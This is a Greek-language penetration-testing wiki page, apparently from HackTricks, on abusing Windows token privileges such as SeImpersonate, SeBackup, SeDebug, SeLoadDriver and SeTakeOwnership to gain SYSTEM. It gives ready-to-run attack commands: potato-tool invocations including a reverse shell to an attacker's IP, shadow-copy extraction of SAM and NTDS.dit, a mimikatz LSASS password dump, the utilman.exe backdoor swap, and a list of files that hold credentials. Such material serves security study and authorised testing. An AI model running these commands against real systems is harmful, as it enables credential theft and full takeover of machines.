# Κατάχρηση Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν γνωρίζετε τι είναι τα Windows Access Tokens**, διαβάστε αυτήν τη σελίδα πριν συνεχίσετε:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως μπορέσετε να κάνετε privilege escalation καταχρώμενοι τα Tokens που ήδη διαθέτετε**

### SeImpersonatePrivilege

Αυτό το privilege, όταν το διαθέτει οποιαδήποτε διεργασία, επιτρέπει την impersonation (αλλά όχι τη δημιουργία) οποιουδήποτε token, υπό την προϋπόθεση ότι μπορεί να αποκτηθεί handle προς αυτό. Ένα privileged token μπορεί να αποκτηθεί από μια Windows service (DCOM), προκαλώντας την να εκτελέσει NTLM authentication προς ένα exploit, και στη συνέχεια επιτρέποντας την εκτέλεση μιας διεργασίας με SYSTEM privileges.<sup>[[2]](#references)</sup> Αυτή η ευπάθεια μπορεί να γίνει exploit χρησιμοποιώντας διάφορα εργαλεία, όπως τα [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί το winrm να είναι απενεργοποιημένο), [SweetPotato](https://github.com/CCob/SweetPotato) και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Σημειώσεις για σύγχρονους operators:

- **Το JuicyPotato είναι legacy**: σε Windows 10 1809+/Server 2019+, προτιμήστε τα **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ή **PrintSpoofer**, ανάλογα με το ποια επιφάνεια RPC/COM είναι ακόμη προσβάσιμη.
- Αν παραβιάσατε μια service που εκτελείται ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και η εντολή `whoami /priv` εμφανίζει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανακτήστε πρώτα το **default privilege set** του account (για παράδειγμα με το **FullPowers**) και δοκιμάστε ξανά την οικογένεια εργαλείων potato.<sup>[[3]](#references)</sup>
- Ορισμένα νεότερα forks είναι πιο φιλικά προς τους operators από τα αρχικά εργαλεία. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και συμβατότητα με σύγχρονες εκδόσεις των Windows, ενώ το **PrintNotifyPotato** κάνει abuse του PrintNotify COM service και είναι συχνά χρήσιμο όταν η κλασική διαδρομή του Spooler είναι απενεργοποιημένη.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege** και χρησιμοποιεί την **ίδια μέθοδο** για να αποκτήσει ένα privileged token.\
Στη συνέχεια, αυτό το privilege επιτρέπει την **ανάθεση ενός primary token** σε μια νέα ή suspended process. Με το privileged impersonation token μπορείτε να παράγετε ένα primary token (DuplicateTokenEx).\
Με το token μπορείτε να δημιουργήσετε μια **νέα process** με το 'CreateProcessAsUser' ή να δημιουργήσετε μια suspended process και να **ορίσετε το token** (γενικά, δεν μπορείτε να τροποποιήσετε το primary token μιας εκτελούμενης process).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Εάν έχετε ενεργοποιημένο αυτό το token, μπορείτε να χρησιμοποιήσετε το **KERB_S4U_LOGON** για να αποκτήσετε ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να γνωρίζετε τα credentials, να **προσθέσετε μια αυθαίρετη ομάδα** (admins) στο token, να ορίσετε το **integrity level** του token σε "**medium**" και να αναθέσετε αυτό το token στο **τρέχον thread** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Μέσω αυτού του privilege, το σύστημα παρέχει **πλήρη πρόσβαση ανάγνωσης** σε οποιοδήποτε file (περιορισμένη σε read operations). Χρησιμοποιείται για την **ανάγνωση των password hashes των local Administrator** accounts από το registry, μετά την οποία εργαλεία όπως τα "**psexec**" ή "**wmiexec**" μπορούν να χρησιμοποιηθούν με το hash (Pass-the-Hash technique). Ωστόσο, αυτή η technique αποτυγχάνει υπό δύο συνθήκες: όταν το Local Administrator account είναι disabled ή όταν υπάρχει policy που αφαιρεί τα administrative rights από Local Administrators που συνδέονται remotely.<sup>[[2]](#references)</sup>\
Στην πράξη, το πιο αξιόπιστο ενσωματωμένο workflow είναι συνήθως το **VSS + `robocopy /b`**: δημιουργήστε ή εκθέστε ένα shadow copy και, στη συνέχεια, αντιγράψτε τα `SAM`/`SYSTEM` ή το `NTDS.dit` σε **backup mode**, παρακάμπτοντας τα file ACLs.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Μπορείτε να εκμεταλλευτείτε αυτό το privilege με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας το **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **escalating privileges with Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Αυτό το privilege παρέχει permission για **write access** σε οποιοδήποτε system file, ανεξάρτητα από το Access Control List (ACL) του αρχείου. Ανοίγει πολλές δυνατότητες για escalation, όπως τη δυνατότητα **modify services**, την εκτέλεση DLL Hijacking και τον ορισμό **debuggers** μέσω των Image File Execution Options, μεταξύ διαφόρων άλλων τεχνικών.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό permission, ιδιαίτερα χρήσιμο όταν ένας user έχει τη δυνατότητα να κάνει impersonate tokens, αλλά και όταν απουσιάζει το SeImpersonatePrivilege. Αυτή η δυνατότητα βασίζεται στην ικανότητα impersonate ενός token που αντιπροσωπεύει τον ίδιο user και του οποίου το integrity level δεν υπερβαίνει εκείνο του τρέχοντος process.<sup>[[2]](#references)</sup>

**Βασικά σημεία:**

- **Impersonation χωρίς SeImpersonatePrivilege:** Είναι δυνατή η αξιοποίηση του SeCreateTokenPrivilege για EoP μέσω impersonation tokens υπό συγκεκριμένες προϋποθέσεις.
- **Προϋποθέσεις για Token Impersonation:** Για επιτυχημένο impersonation, το target token πρέπει να ανήκει στον ίδιο user και να έχει integrity level μικρότερο ή ίσο με το integrity level του process που επιχειρεί το impersonation.
- **Δημιουργία και τροποποίηση Impersonation Tokens:** Οι users μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) μιας privileged group.

### SeLoadDriverPrivilege

Αυτό το privilege επιτρέπει το **load και unload device drivers** μέσω της δημιουργίας ενός registry entry με συγκεκριμένες τιμές για τα `ImagePath` και `Type`. Επειδή το direct write access στο `HKLM` (HKEY_LOCAL_MACHINE) είναι περιορισμένο, πρέπει να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, για να γίνει το `HKCU` αναγνωρίσιμο από τον kernel για driver configuration, πρέπει να ακολουθηθεί ένα συγκεκριμένο path.<sup>[[2]](#references)</sup>

Η σύγχρονη offensive χρήση είναι συνήθως **BYOVD** (bring your own vulnerable driver): φόρτωση ενός **signed but vulnerable** kernel driver και στη συνέχεια χρήση των IOCTLs του για την απενεργοποίηση protections ή για μετάβαση σε kernel code execution. Έχετε υπόψη ότι σε πρόσφατα Windows 11/Server builds, το **Microsoft vulnerable driver blocklist** και/ή το **HVCI/Memory Integrity** συχνά διακόπτουν παλαιότερα public chains, επομένως τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον καθολικά αξιόπιστα.

Αυτό το path είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου το `<RID>` είναι το Relative Identifier του τρέχοντος user. Μέσα στο `HKCU`, πρέπει να δημιουργηθεί ολόκληρο αυτό το path και να οριστούν δύο values:<sup>[[2]](#references)</sup>

- `ImagePath`, δηλαδή το path προς το binary που θα εκτελεστεί
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Βήματα:**

1. Πρόσβαση στο `HKCU` αντί για το `HKLM`, λόγω του περιορισμένου write access.
2. Δημιουργία του path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιπροσωπεύει το Relative Identifier του τρέχοντος user.
3. Ορισμός του `ImagePath` στο execution path του binary.
4. Αντιστοίχιση του `Type` σε `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Περισσότεροι τρόποι κατάχρησης αυτού του privilege στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε μια διεργασία να **αναλάβει την ιδιοκτησία ενός αντικειμένου**, παρακάμπτοντας την απαίτηση για ρητή διακριτική πρόσβαση μέσω της παροχής δικαιωμάτων πρόσβασης WRITE_OWNER. Η διαδικασία περιλαμβάνει πρώτα την εξασφάλιση της ιδιοκτησίας του προβλεπόμενου registry key για σκοπούς εγγραφής και, στη συνέχεια, την τροποποίηση του DACL ώστε να ενεργοποιηθούν οι λειτουργίες εγγραφής.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Αυτό το privilege επιτρέπει το **debug άλλων processes**, συμπεριλαμβανομένης της ανάγνωσης και εγγραφής στη μνήμη. Με αυτό το privilege μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές memory injection, ικανές να παρακάμψουν τις περισσότερες λύσεις antivirus και host intrusion prevention.<sup>[[2]](#references)</sup>

Στα σύγχρονα Windows, να θυμάστε ότι το `SeDebugPrivilege` είναι συνήθως αρκετό για το άνοιγμα **μη προστατευμένων SYSTEM processes** και την αντιγραφή των token τους, αλλά **δεν αποτελεί εγγύηση ότι μπορείτε να αγγίξετε το** **LSASS**. Αν είναι ενεργοποιημένο το **RunAsPPL / LSA Protection**, τα μη προστατευμένα processes δεν μπορούν να διαβάσουν ή να κάνουν injection στο LSASS, ακόμη και αν υπάρχει το `SeDebugPrivilege`. Σε αυτήν την περίπτωση, κλέψτε ένα token από κάποιο άλλο μη-PPL SYSTEM process ή συνδυάστε το με ένα PPL bypass/BYOVD, αντί να θεωρήσετε δεδομένο ότι θα λειτουργήσει το `procdump`. Για ένα πλήρες παράδειγμα αντιγραφής token με χρήση των `SeDebugPrivilege` + `SeImpersonatePrivilege`, δείτε [αυτή τη σελίδα](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Μπορείτε να χρησιμοποιήσετε το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **καταγράψετε τη μνήμη ενός process**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στο process **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, το οποίο είναι υπεύθυνο για την αποθήκευση των διαπιστευτηρίων των χρηστών αφού ένας χρήστης συνδεθεί επιτυχώς σε ένα σύστημα.

Στη συνέχεια, μπορείτε να φορτώσετε αυτό το dump στο mimikatz για να αποκτήσετε κωδικούς πρόσβασης:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Αν θέλετε να αποκτήσετε ένα `NT SYSTEM` shell, μπορείτε να χρησιμοποιήσετε:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Αυτό το δικαίωμα (Perform volume maintenance tasks) επιτρέπει το άνοιγμα raw volume device handles (π.χ. \\.\C:) για άμεσο disk I/O που παρακάμπτει τα NTFS ACLs. Με αυτό μπορείτε να αντιγράψετε bytes οποιουδήποτε αρχείου στο volume, διαβάζοντας τα υποκείμενα blocks, και να εκτελέσετε arbitrary file read ευαίσθητου υλικού (π.χ. machine private keys στο %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS μέσω VSS).<sup>[[5]](#references)</sup> Έχει ιδιαίτερα σημαντικό αντίκτυπο σε CA servers, όπου η εξαγωγή του CA private key επιτρέπει τη δημιουργία ενός Golden Certificate για την impersonation οποιουδήποτε principal.<sup>[[6]](#references)</sup>

Δείτε λεπτομερείς τεχνικές και mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Έλεγχος προνομίων
```
whoami /priv
```
Τα **tokens που εμφανίζονται ως Disabled** μπορούν συνήθως να ενεργοποιηθούν, επομένως συχνά μπορείτε να κάνετε abuse τόσο στα _Enabled_ όσο και στα _Disabled privileges_.

### Ενεργοποίηση όλων των tokens

Αν έχετε disabled privileges, μπορείτε να χρησιμοποιήσετε το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσετε όλα τα tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or το **script** που είναι embedded σε αυτό το [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Πίνακας

Πλήρες cheatsheet για τα token privileges στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), ενώ η παρακάτω σύνοψη παραθέτει μόνο τους άμεσους τρόπους εκμετάλλευσης του privilege για την απόκτηση admin session ή την ανάγνωση ευαίσθητων αρχείων.<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Θα επέτρεπε σε έναν χρήστη να κάνει impersonate tokens και privesc σε nt system χρησιμοποιώντας εργαλεία όπως τα potato.exe, rottenpotato.exe και juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για την ενημέρωση. Θα προσπαθήσω σύντομα να το διατυπώσω ξανά με πιο recipe-like τρόπο.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή με dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Χρήσιμο για τα `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` και, σε ορισμένες περιπτώσεις, το `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι βολικό, αλλά τα dedicated SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για locked/open αρχεία.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Δημιουργία αυθαίρετου token, συμπεριλαμβανομένων local admin rights, με το `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Αντιγραφή ενός **non-PPL** SYSTEM token ή dump της μνήμης από non-protected process.                                                                                                                                                                                                                                                                 | <p>Το LSASS dumping συνήθως μπλοκάρεται αν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Το script βρίσκεται στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Χρήση της **Potato family** / named-pipe impersonation για spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` κ.ά.).                                                                                                                                                                                    | <p>Πρακτικά, χρησιμοποιείται κυρίως από service accounts όπως IIS APPPOOL, MSSQL, scheduled tasks ή οποιοδήποτε context διαθέτει ήδη `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Φόρτωση ενός signed-but-vulnerable kernel driver (BYOVD)<br>2. Χρήση των IOCTLs του driver για kernel R/W, απενεργοποίηση security tooling ή privilege escalation σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για unload security-related drivers με την ενσωματωμένη εντολή <code>fltMC</code>, δηλαδή <code>fltMC sysmondrv</code></p>                     | <p>Παλαιότεροι public drivers όπως ο <code>szkg64.sys</code> μπλοκάρονται όλο και περισσότερο στα σύγχρονα Windows από τη vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκίνηση του PowerShell/ISE με διαθέσιμο το SeRestore privilege.<br>2. Ενεργοποίηση του privilege με το <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομασία του utilman.exe σε utilman.old<br>4. Μετονομασία του cmd.exe σε utilman.exe<br>5. Κλείδωμα της console και πάτημα των Win+U</p> | <p>Η επίθεση μπορεί να ανιχνευθεί από ορισμένα AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files", χρησιμοποιώντας το ίδιο privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομασία του cmd.exe σε utilman.exe<br>4. Κλείδωμα της console και πάτημα των Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να ανιχνευθεί από ορισμένα AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files", χρησιμοποιώντας το ίδιο privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulation tokens ώστε να περιλαμβάνουν local admin rights. Ενδέχεται να απαιτείται SeImpersonate.</p><p>Προς επαλήθευση.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
